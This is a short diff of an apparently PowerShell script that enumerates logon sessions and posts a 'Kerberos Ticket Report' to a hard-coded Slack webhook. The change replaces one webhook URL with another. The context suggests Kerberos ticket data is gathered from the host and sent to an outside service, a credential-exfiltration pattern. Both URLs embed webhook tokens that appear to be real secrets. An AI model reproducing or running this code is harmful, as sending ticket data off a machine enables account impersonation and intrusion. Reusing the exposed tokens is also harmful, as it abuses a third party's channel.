@@ -260,7 +260,7 @@ Function EnumerateLogonSessions()
             if((@($sessioncred).Count -gt 0) -and ($sessioncred[0].LogonSession[0].LogonID.LowPart -ne "0") )
             {
                 # Define your Slack webhook URL
-                $slackWebhookUrl = 'https://hooks.slack.com/services/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'
+                $slackWebhookUrl = 'https://hooks.slack.com/services/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'
 
                 # Build the message string
                 $message = ":ticket:Kerberos Ticket Report:ticket:`n"
